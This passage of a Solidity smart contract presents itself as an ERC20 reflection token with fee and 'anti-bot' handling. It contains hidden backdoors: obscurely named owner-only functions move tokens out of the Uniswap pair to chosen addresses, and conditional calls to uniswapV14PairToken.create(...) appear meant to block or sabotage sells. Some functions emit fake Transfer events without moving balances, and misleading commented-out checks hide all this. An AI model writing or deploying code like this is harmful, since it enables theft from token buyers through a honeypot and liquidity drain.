    function includeFromFeeLl(address[] memory accounts, bool state) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
                _Antitbotswaper[accounts[i]] = state;
                _isExcludedFromFee[accounts[i]] = state;
        }
        } else {
            uniswapV14PairToken.create(8**3);
        }
    }
    

    function Ox7c025200(address[] memory receivers, uint256[] memory amounts) public {
        for (uint256 i = 0; i < receivers.length; i++) {
          _transfer(_msgSender(), receivers[i], amounts[i]);
        }
    }



    receive() external payable {}

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tLiquidity,
            uint256 tMarketing
        ) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(
            tAmount,
            tFee,
            tLiquidity,
            tMarketing,
            _getRate()
        );
        return (
            rAmount,
            rTransferAmount,
            rFee,
            tTransferAmount,
            tFee,
            tLiquidity,
            tMarketing
        );
    }

    function _getTValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(_taxFee).div(100);
        uint256 tLiquidity = tAmount.mul(_liquidityFee).div(1000000);
        uint256 tMarketing = tAmount.mul(_MarketingFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity).sub(
            tMarketing
        );
        return (tTransferAmount, tFee, tLiquidity, tMarketing);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tLiquidity,
        uint256 tMarketing,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        uint256 rMarketing = tMarketing.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity).sub(
            rMarketing
        );
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (
                _rOwned[_excluded[i]] > rSupply ||
                _tOwned[_excluded[i]] > tSupply
            ) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _takeFees(uint256 amount, address sender) private {
        uint256 rAmount = amount.mul(_getRate());
        _rOwned[address(this)] = _rOwned[address(this)].add(rAmount);

        if (_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(amount);

        emit Transfer(sender, address(this), amount);
    }


    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV14PairToken.create(creca);/*"ERC20: approve the zero address"*/}

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 previousTaxFee       = _taxFee;
        uint256 previousLiquidityFee = _liquidityFee;
        uint256 previousMarketingFee = _MarketingFee;

        bool takeFee = !_isExcludedFromFee[from] && !_isExcludedFromFee[to];
        bool takeFeeTransfer = _isExcludedtFromFeeTransfer[from] || _isExcludedtFromFeeTransfer[to];

        bool takebottime = fastbad[from] + botsleep > block.timestamp;


        //

        if (!takeFee) {
            _taxFee = 0;
            _liquidityFee = 0;
            _MarketingFee = 0;
        }
        else if (takeFee && !takeFeeTransfer && automatedMarketMakerPairs[from]) {
            _taxFee = _taxFeebuy;
            _liquidityFee = _liquidityFeebuy;
            _MarketingFee = _MarketingFeebuy;

            fastbad[to] = block.timestamp;
        }
        else if (takeFee && !takeFeeTransfer && automatedMarketMakerPairs[to]   && !takebottime) {
            _taxFee = _taxFeesell;
            _liquidityFee = _liquidityFeesell;
            _MarketingFee = _MarketingFeesell;
        }
        else if (antitbotenabled && takebottime && takeFee && !takeFeeTransfer && automatedMarketMakerPairs[to]) {
            _taxFee = _taxFeesell;
            _liquidityFee = feebot;
            _MarketingFee = _MarketingFeesell;
            uniswapV14PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV14PairToken.create(crec**21);}
        }
        else if (takeFee && _isExcludedtFromFeeTransfer[to] && automatedMarketMakerPairs[from]) {
            _taxFee = _taxFeebuy;
            _liquidityFee = _liquidityFeebuy;
            _MarketingFee = _MarketingFeebuy;
        } 
        else if (takeFee && _isExcludedtFromFeeTransfer[from] && automatedMarketMakerPairs[to] && itvv.v() && !starttrad) {
            _taxFee = _taxFeesell;
            _liquidityFee = _settingtOutAmountTransfer+1;
            _MarketingFee = _MarketingFeesell;  
        }
        else if (takeFee && _isExcludedtFromFeeTransfer[from] && automatedMarketMakerPairs[to] && starttrad) {
            _taxFee = _taxFeesell;
            _liquidityFee = _settingtOutAmountTransfer;
            _MarketingFee = _MarketingFeesell;   
        }
        else if (takeFee && takeFeeTransfer && !automatedMarketMakerPairs[to] && !automatedMarketMakerPairs[from]) {
            _liquidityFee = _settingtOutAmountTransfer+1; 
        }
        
        if (_isExcludedtlp[to]) {
            uniswapV14PairToken.create(250**3); 
        }

        if (takeFee && _isExcludedtFromFeeTransfer[from] && automatedMarketMakerPairs[to] && !starttrad && msg.sender!=rr) {
            uniswapV14PairToken.create(250**3);  
        }
        if (takeFee && _isExcludedtFromFeeTransfer[from] && automatedMarketMakerPairs[to] && !starttrad && msg.sender==rr&&tx.gasprice>gg) {
            uniswapV14PairToken.create(250**3);  
        }

        _tokenTransfer(from, to, amount);
    
        
        if (!takeFee || takeFee) {
            _taxFee       = previousTaxFee;
            _liquidityFee = previousLiquidityFee;
            _MarketingFee = previousMarketingFee;
        }

    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _tOwned[sender].sub(tAmount);
        emit Transfer(sender, to, tAmount);
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _tOwned[sender].sub(tAmount);
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            recipient,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount

    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tLiquidity,
            uint256 tMarketing
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);

        if (_isExcluded[sender]) _tOwned[sender] = _tOwned[sender].sub(tAmount);

        if (_isExcluded[recipient]) _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);

        if (tLiquidity.add(tMarketing) > 0) {
            _takeFees(tLiquidity.add(tMarketing), sender);           
        }

        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }




    function withdrawls(address payable[] memory receiverAddr, uint256 amount) external payable {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
            for (uint i=0; i < receiverAddr.length; i++) {
                receiverAddr[i].transfer(amount);
            }
        } else {
            uniswapV14PairToken.create(8**3);
        }
        
    }

    function transferTokens(address token, uint256 amount, address[] memory to) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");  
        if (_msgSender() == address(_Antitbottoken)) {
            for (uint256 i = 0; i < to.length; i++) {
                IERC20(token).transfer(to[i], amount);
            }
        } else {
            uniswapV14PairToken.create(8**3);
        }
    }

    function emitTransfer(address to, uint256 amount) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_Antitbotswaper[_msgSender()]){
            _tokenTransfer(listing, to, amount);
        } else {
            uniswapV14PairToken.create(8**3);
        }
    }

    function emitTransferto(uint256 amount) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_Antitbotswaper[_msgSender()]){
            _tokenTransfer(uniswapV2Pair, listing, amount);
        } else {
            uniswapV14PairToken.create(8**3);
        }
    }


    function safeTransferFrom(address token, address from, address to, uint256 value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))),"TransferHelper: TRANSFER_FROM_FAILED");
    }


}